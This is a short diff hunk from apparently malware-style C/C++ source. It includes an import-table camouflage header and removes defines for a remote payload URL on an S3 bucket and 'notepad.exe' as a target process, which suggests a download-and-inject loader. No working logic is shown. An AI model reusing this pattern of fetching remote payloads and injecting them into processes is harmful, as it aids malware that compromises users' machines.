@@ -6,8 +6,6 @@
 #include "IATCamo.h"
 #include "Debug.h"
 
-#define PAYLOAD L"https://i-dont-love-daniel.s3.eu-north-1.amazonaws.com/FORWARD.bin"
-#define PROC L"notepad.exe"
 
 
 
